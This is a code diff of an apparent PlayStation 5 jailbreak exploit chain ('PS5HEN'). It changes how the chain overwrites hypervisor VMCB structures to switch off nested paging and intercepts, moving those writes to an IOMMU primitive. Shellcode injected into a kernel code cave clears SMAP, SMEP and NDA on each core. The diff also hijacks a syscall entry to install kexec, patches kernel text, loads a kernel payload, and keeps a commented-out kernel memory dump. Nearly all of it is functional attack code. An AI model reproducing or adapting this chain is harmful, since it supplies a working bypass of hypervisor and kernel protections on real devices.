@@ -14,6 +14,7 @@ extern "C" int cpuset(cpusetid_t *);
 #include "hv_defeat.h"
 #include "util.h"
 #include "gpu_dma.h"
+#include "iommu.h"
 #include "patches.h"
 
 int stage0_discover(hv_defeat_ctx *ctx) {
@@ -107,7 +108,23 @@ int stage1_tmr_relax(hv_defeat_ctx *ctx) {
 }
 
 uint64_t get_vmcb (hv_defeat_ctx *ctx, int core) {
+
+    uint32_t tmr16_base = tmr_read(ctx->dmap_base, TMR_BASE(16));
+    tmr16_base = tmr16_base << 16;
+
     switch (ctx->fw) {
+        case 0x0200:
+        case 0x0220:
+        case 0x0225:
+        case 0x0226:
+        case 0x0230:
+        case 0x0250:
+        case 0x0270:
+            if( core == 0 )
+                return (uint64_t)tmr16_base + (uint64_t)0x11BD000;
+            else
+                return (uint64_t)tmr16_base + (uint64_t)0x14E2000 + (uint64_t)core * 0x4000;
+            break;
         case 0x0300:
         case 0x0310:
         case 0x0320:
@@ -126,7 +143,8 @@ uint64_t get_vmcb (hv_defeat_ctx *ctx, int core) {
     }
 }
 
-int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
+int stage2_find_vmcbs(hv_defeat_ctx *ctx) 
+{
     std::print("\n[stage2] vmcb discovery\n");
 
     uint64_t vcpu_off = fw_off(ctx->fw, "HV_VCPU");
@@ -157,93 +175,64 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
 
     ctx->vmcb_count = 0;
     for (int c = 0; c < 16; c++) {
-        uint64_t ptr_pa;
 
-        if (ctx->fw >= 0x0300) {
-            uint64_t vmcb_pa = get_vmcb(ctx, c);
-            std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
+        uint64_t vmcb_pa = get_vmcb(ctx, c);
+        std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
 
-            if (ctx->vmcb_count < MAX_VMCBS) {
-                ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
-                ctx->vmcb_count++;
-            }
-        }
-        else {
-            // use VA + pmap_kextract (embedded HV has valid kernel VAs)
-            uint64_t ptr_va = ctx->hv_data_va + vcpu_off + (uint64_t)c * stride;
-            ptr_pa = pmap_kextract(ptr_va);
-
-
-            uint64_t vmcb_va = gpu_read_phys8(ptr_pa);
-            if ((vmcb_va >> 32) != 0xFFFFFFFF || (vmcb_va & 0xFFF) != 0) {
-                std::print("  core {:2d}: bad vmcb_va 0x{:x}\n", c, vmcb_va);
-                return -2;
-            }
-
-            uint64_t vmcb_pa = pmap_kextract(vmcb_va);
-            std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
-
-            if (ctx->vmcb_count < MAX_VMCBS) {
-                ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
-                ctx->vmcb_count++;
-            }
+        if (ctx->vmcb_count < MAX_VMCBS) {
+            ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
+            ctx->vmcb_count++;
         }
     }
+    
     std::print("  {} vmcbs\n", ctx->vmcb_count);
     return ctx->vmcb_count == 0 ? -2 : 0;
 }
 
-int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
-    std::print("\n[stage3] vmcb patch\n");
+int iommu_selftest(iommu_ctx *iommu, uint64_t dmap) {
+    std::print("\n[iommu] self-test\n");
+
+    uint64_t scratch = 0xAAAAAAAABBBBBBBBULL;
+    uint64_t scratch_pa = pmap_kextract((uint64_t)&scratch);
+
+    if (!scratch_pa || scratch_pa >= 0x100000000ULL) {
+        std::print("  bad scratch PA 0x{:x}\n", scratch_pa);
+        return -1;
+    }
+
+    uint64_t pattern = 0xDEADCAFE12345678ULL;
+    std::print("  scratch pa=0x{:x} before=0x{:016x}\n", scratch_pa, scratch);
+
+    iommu_write8_pa(iommu, scratch_pa, pattern);
+    uint64_t readback = kr8(dmap + scratch_pa);
+
+    std::print("  wrote=0x{:016x} read=0x{:016x} {}\n",
+        pattern, readback, (readback == pattern) ? "OK" : "FAIL");
+
+    return (readback == pattern) ? 0 : -1;
+}
+
+int stage3_patch_vmcbs(hv_defeat_ctx *ctx, iommu_ctx *iommu) {
+    std::print("\n[stage3-iommu] vmcb patch via IOMMU\n");
     if (ctx->vmcb_count == 0) return -1;
-
-    uint32_t np0 = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_NP_ENABLE);
-
-    if( np0 == 0x0 )
-    {
-        notify("Hypervisor already disabled, aborting..");
-
-        return 0;
-    }
-
-    if (np0 != 0x9) {
-        std::print("  vmcb[0] np=0x{:x}, expected 0x9 - aborting\n", np0);
-        return -2;
-    }
 
     int cur = sceKernelGetCurrentCpu();
     pin_to_core(cur);
 
     for (int i = 0; i < ctx->vmcb_count; i++) {
-
         uint64_t pa = ctx->vmcb_pas[i];
 
-        // read-modify-write: one GPU read, patch fields, one GPU write
-        vmcb_control_patch ctl;
-        gpu_read_phys(pa, &ctl, sizeof(ctl));
+        iommu_write8_pa(iommu, pa + 0x00, 0x0000000000000000ULL);
+        iommu_write8_pa(iommu, pa + 0x08, 0x0004000000000000ULL);
+        iommu_write8_pa(iommu, pa + 0x10, 0x000000000000000FULL);
+        iommu_write8_pa(iommu, pa + 0x58, 0x0000000000000001ULL);
+        iommu_write8_pa(iommu, pa + 0x90, 0x0000000000000000ULL);
 
-        ctl.np_enable      = 0;
-        ctl.intercept_cr   = 0;
-        ctl.intercept_exc  = 0;              // exception bitmap cleared
-        ctl.intercept_misc = (1u << 18);     // keep CPUID
-        ctl.intercept_vmxx = 0xF;            // VMSAVE/VMLOAD/VMMCALL/VMRUN
-        ctl.tlb_control    = 1;              // flush TLB on VMRUN
-        //ctl.vmcb_clean     = 0;              // nothing clean
-
-        gpu_write_phys(pa, &ctl, sizeof(ctl));
-
-        std::print("  vmcb[{:2d}] patched\n", i);
+        std::print("  vmcb[{:2d}] patched (pa=0x{:x})\n", i, pa);
         usleep(1000);
     }
 
-    for (int i = 0; i < 16; i++) {
-        if (pin_to_core(i) == 0) {
-            usleep(1000);
-            getpid();
-        }
-    }
-    usleep(200000);
-    pin_to_core( 9 );
+    pin_to_core(9);
 
     ctx->vmcbs_patched = 1;
     std::print("  done, {} cores\n", ctx->vmcb_count);
@@ -294,14 +283,12 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
 
 
 int stage4_verify(hv_defeat_ctx *ctx) {
-    usleep(15000000);
+    usleep(5000000);
     std::print("\n[stage4] verify\n");
-
-    //pin_to_first_available_core();
 
     uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
     uint64_t hvdata = kr8(ctx->hv_data_va);
-    uint32_t np = ctx->vmcb_count > 0 ? gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_NP_ENABLE) : 0xFF;
+    uint32_t np = ctx->vmcb_count > 0 ? (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_NP_ENABLE) : 0xFF;
 
     std::print("  ktext  0x{:016x}{}\n", ktext, (ktext != 0 && ktext != ~0ULL) ? " ok" : " fail");
     std::print("  hvdata 0x{:016x}{}\n", hvdata, (hvdata != ~0ULL) ? " ok" : " fail");
@@ -309,10 +296,10 @@ int stage4_verify(hv_defeat_ctx *ctx) {
 
     // verify intercepts persisted on vmcb[0]
     if (ctx->vmcb_count > 0) {
-        uint32_t cr  = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_CR);
-        uint32_t exc = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_EXC);
-        uint32_t g1  = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_MISC);
-        uint32_t g2  = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_VMXX);
+        uint32_t cr  = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_CR);
+        uint32_t exc = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_EXC);
+        uint32_t g1  = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_MISC);
+        uint32_t g2  = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_VMXX);
         std::print("  vmcb0  cr=0x{:x} exc=0x{:x} g1=0x{:x} g2=0x{:x}{}\n",
             cr, exc, g1, g2, (cr == 0 && exc == 0 && g1 == 0) ? " ok" : " REVERTED");
     }
@@ -340,52 +327,42 @@ static int widen_cpuset_syscall() {
     return 0;
 }
 
-static int flush_tlb_all_cores(hv_defeat_ctx *ctx) {
+[[maybe_unused]] static int clear_smap_smep_nda(hv_defeat_ctx *ctx) {
+    std::print("\n[smap/smep/nda] clearing on all cores\n");
 
-    std::print("\n[tlb flush]\n");
-
-    // B9 80 00 00 C0        mov ecx, 0xC0000080
-    // 0F 32                 rdmsr
-    // 0F 30                 wrmsr  (flush TLB + serialize pipeline)
-    // 0F 20 E0              mov rax, cr4
-    // 48 25 FF FF CF FF     and rax, 0xFFFFFFFFFFCFFFFF  (clear SMAP+SMEP)
-    // 0F 22 E0              mov cr4, rax
-    // B9 80 00 00 C0        mov ecx, 0xC0000080
-    // 0F 32                 rdmsr
-    // 25 FF FF FE FF        and eax, 0xFFFEFFFF  (clear NDA)
-    // 0F 30                 wrmsr
-    // C3                    ret
     uint8_t gadget[] = {
-        0xB9, 0x80, 0x00, 0x00, 0xC0,
-        0x0F, 0x32,
-        0x0F, 0x30,
-        0x0F, 0x20, 0xE0,
-        0x48, 0x25, 0xFF, 0xFF, 0xCF, 0xFF,
-        0x0F, 0x22, 0xE0,
-        0xB9, 0x80, 0x00, 0x00, 0xC0,
-        0x0F, 0x32,
-        0x25, 0xFF, 0xFF, 0xFE, 0xFF,
-        0x0F, 0x30,
-        0xC3
+        // clear SMAP (bit 21) + SMEP (bit 20) in CR4
+        0x0F, 0x20, 0xE0,                          // mov rax, cr4
+        0x48, 0x25, 0xFF, 0xFF, 0xCF, 0xFF,        // and rax, ~(3<<20)
+        0x0F, 0x22, 0xE0,                          // mov cr4, rax
+        // clear NDA (bit 16) in EFER MSR
+        0xB9, 0x80, 0x00, 0x00, 0xC0,              // mov ecx, 0xC0000080
+        0x0F, 0x32,                                 // rdmsr
+        0x25, 0xFF, 0xFF, 0xFE, 0xFF,              // and eax, ~(1<<16)
+        0x0F, 0x30,                                 // wrmsr
+        0xC3                                        // ret
     };
 
     uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
     uint64_t gadget_va = ktext + fw_off(ctx->fw, "KERNEL_OFF_CODE_CAVE") + 0x20000;
     uint64_t gadget_pa = pmap_kextract(gadget_va);
-    gpu_write_phys(gadget_pa, gadget, sizeof(gadget));
 
-    int flushed = 0;
+    std::print("[clear_smap_smep_nda] before kernel_copyin into ktext code cave");
+
+    usleep(3000000);
+
+    kernel_copyin(gadget, ctx->dmap_base + gadget_pa, sizeof(gadget));
+
+    int done = 0;
     for (int i = 0; i < 16; i++) {
         if (pin_to_core(i) == 0) {
             kexec(gadget_va);
             usleep(1000);
-            flushed++;
-        } else {
-            std::print("  core {} pin failed\n", i);
+            done++;
         }
     }
     unpin();
-    std::print("  flushed {}/16 cores\n", flushed);
+    std::print("  cleared on {}/16 cores\n", done);
     return 0;
 }
 
@@ -405,7 +382,7 @@ int stage5_patch_kernel(hv_defeat_ctx *ctx) {
         uint64_t va = ktext + p.offset;
         uint64_t pa = pmap_kextract(va);
         if (pa && pa < 0x100000000ULL) {
-            gpu_write_phys(pa, p.bytes, p.len);
+            kernel_copyin(p.bytes, ctx->dmap_base + pa, p.len);
             n++;
         }
     }
@@ -436,12 +413,13 @@ int stage6_install_kexec(hv_defeat_ctx *ctx) {
         return -1;
     }
 
-    gpu_write_phys4(entry_pa + offsetof(sysent, n_arg),     2);
-    gpu_write_phys8(entry_pa + offsetof(sysent, sy_call),   jmp);
-    gpu_write_phys4(entry_pa + offsetof(sysent, sy_flags),  0);
-    gpu_write_phys4(entry_pa + offsetof(sysent, sy_thrcnt), 1);
+    uint64_t dmap = ctx->dmap_base;
+    dw4(dmap, entry_pa + offsetof(sysent, n_arg),     2);
+    kw8(dmap + entry_pa + offsetof(sysent, sy_call),  jmp);
+    dw4(dmap, entry_pa + offsetof(sysent, sy_flags),  0);
+    dw4(dmap, entry_pa + offsetof(sysent, sy_thrcnt), 1);
 
-    uint64_t v = gpu_read_phys8(entry_pa + offsetof(sysent, sy_call));
+    uint64_t v = kr8(dmap + entry_pa + offsetof(sysent, sy_call));
     std::print("  sysent[0x11].sy_call = 0x{:x}{}\n", v, (v == jmp) ? " ok" : " fail");
 
     return (v == jmp) ? 0 : -1;
@@ -477,27 +455,17 @@ int stage7_run_hen(hv_defeat_ctx *ctx) {
         return -1;
     }
 
-    // HEN binary fits in single 2MB GPU DMA window
-    // Only chunk if the range crosses alignment boundary
-    // Make sure that HEN fits into this 4MB window!!!
+    std::print("  copying {} bytes to va=0x{:x} (pa=0x{:x})\n", sz, dest, dest_pa);
 
-    constexpr uint64_t GPU_WINDOW = 2 * 0x100000;
-    uint64_t window_end = (dest_pa & ~(GPU_WINDOW - 1)) + GPU_WINDOW;
-    uint64_t first_chunk = window_end - dest_pa;
-
-    if (first_chunk >= sz) {
-        gpu_write_phys(dest_pa, KELF, (uint32_t)sz);
-    } else {
-        gpu_write_phys(dest_pa, KELF, (uint32_t)first_chunk);
-        gpu_write_phys(dest_pa + first_chunk, &KELF[first_chunk],
-                       (uint32_t)(sz - first_chunk));
+    constexpr uint32_t CHUNK = 0x1000;  // 4KB chunks
+    uint64_t written = 0;
+    while (written < sz) {
+        uint32_t n = (sz - written > CHUNK) ? CHUNK : (uint32_t)(sz - written);
+        kernel_copyin(&KELF[written], dest + written, n);
+        written += n;
     }
 
-    usleep(100000);
-
-    std::print("  copied {} bytes to 0x{:x}\n", sz, dest);
-
-    pin_to_core( 9 );
+    std::print("  copied {} bytes\n", sz);
 
     int ret = kexec(dest);
     std::print("  kexec returned 0x{:x}\n", ret);
@@ -505,11 +473,48 @@ int stage7_run_hen(hv_defeat_ctx *ctx) {
     return ret;
 }
 
-int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
+int write_memory_to_file(const char *filename, const void *va, size_t size) {
+    int fd;
+    size_t bytes_written_total = 0;
+
+    constexpr auto CHUNK_SIZE = 0x5000;
+
+    uint8_t* buffer = (uint8_t*)malloc(CHUNK_SIZE);
+
+    // Abrir archivo: Escritura, Crear si no existe, Truncar si existe. Permisos 0644.
+    fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd == -1) {
+        perror("Error al abrir el archivo");
+        return -1;
+    }
+
+    while (bytes_written_total < size) {
+        // Calcular cuánto falta por escribir
+        size_t remaining = size - bytes_written_total;
+        // Decidir si escribimos el bloque completo (0x5000) o lo que sobra
+        size_t to_write = (remaining >= CHUNK_SIZE) ? CHUNK_SIZE : remaining;
+
+        // Read from kernel
+        kernel_copyout((uint64_t) va + bytes_written_total, buffer, to_write);
+        // Escribir directamente desde la dirección de memoria al descriptor de archivo
+        ssize_t result = write(fd, buffer, to_write);
+        
+        if (result == -1) {
+            perror("Error durante la escritura");
+            close(fd);
+            return -1;
+        }
+
+        bytes_written_total += result;
+    }
+
+    close(fd);
+    return 0;
+}
+
+int run_hv_defeat(void) {
     hv_defeat_ctx ctx;
     memset(&ctx, 0, sizeof(ctx));
-    // ctx.mp4_softc = mp4_softc;
-    // ctx.zcn_bar2 = zcn_bar2;
 
     int r;
 
@@ -520,6 +525,7 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
     if (widen_cpuset_syscall() != 0)
         std::print("  cpuset widen failed\n");
 
+    // init GPU DMA
     gpu_kernel_offsets go = {};
     go.proc_vmspace = KERNEL_OFFSET_PROC_P_VMSPACE;
     go.vmspace_vm_vmid = fw_off(ctx.fw, "VMSPACE_VM_VMID");
@@ -534,15 +540,22 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
 
     if ((r = stage1_tmr_relax(&ctx))) return r;
 
+    // init IOMMU write primitive
+    iommu_ctx iommu;
+    if ((r = iommu_init(&iommu, ctx.dmap_base, ctx.kbase, ctx.fw))) {
+        std::print("[iommu] init failed ({}), falling back to GPU DMA\n", r);
+    }
+
+    if (r == 0 && (r = iommu_selftest(&iommu, ctx.dmap_base))) {
+        std::print("[iommu] self-test failed, falling back to GPU DMA\n");
+    }
+
     if ((r = stage2_find_vmcbs(&ctx))) return r;
 
-    if ((r = stage3_patch_vmcbs(&ctx))) return r;
-
+    if ((r = stage3_patch_vmcbs(&ctx, &iommu))) return r;
+   
     if ((r = stage3b_remove_xotext(&ctx))) return r;
-    
-    // triggers a vmexit on all cores
-    // to apply the vmcb patches
-    // credits: theflow (thank you <3)
+
     {
         static jmp_buf jmp_env;
         static volatile int vmmcall_faulted;
@@ -557,9 +570,7 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
             vmmcall_faulted = 0;
 
             if (setjmp(jmp_env) == 0) {
-                asm volatile(
-                    "vmmcall"
-                );
+                asm volatile("vmmcall");
             }
 
             usleep(1000);
@@ -570,29 +581,33 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
         signal(SIGILL, old_handler);
     }
 
-    if (true) {
+    usleep(1000000);
 
-        kernel_pmap_invalidate_all();
+    kernel_pmap_invalidate_all();
 
-        stage4_verify(&ctx);
+    stage4_verify(&ctx);
 
-        stage5_patch_kernel(&ctx);
+    stage5_patch_kernel(&ctx);
 
-        usleep(10000);
+    if ((r = stage6_install_kexec(&ctx))) return r;
 
-        if ((r = stage6_install_kexec(&ctx))) return r;
+    clear_smap_smep_nda(&ctx);
 
-        flush_tlb_all_cores(&ctx);
-    }
-
-    usleep(100000);
-    
-    stage7_run_hen(&ctx);
+    //stage7_run_hen(&ctx);
 
     uint32_t fw_ver = kernel_get_fw_version();
     notify(std::format("Welcome To PS5HEN 1.3\nPlayStation 5 FW: {:d}.{:02d}\nBy SpecterDev, f0f, flat_z",
         (fw_ver >> 24) & 0xFF, (fw_ver >> 16) & 0xFF));
 
+
+    /*uint64_t ktext_base = KERNEL_ADDRESS_TEXT_BASE;
+    std::string kernel_dump_name = std::format( "/mnt/usb0/kernel_{:08X}_{:16X}.bin", fw_ver, ktext_base);
+    uint64_t OFFSET_KERNEL_DATA = 0x0BD0000;
+    uint64_t SIZE_KERNEL_DATA =   0x087B1930;
+    uint64_t SIZE_KTEXT_KDATA = OFFSET_KERNEL_DATA + SIZE_KERNEL_DATA;
+
+    write_memory_to_file(kernel_dump_name.c_str(), (void*) ktext_base, SIZE_KTEXT_KDATA);
+        */
     return 0;
 }
 
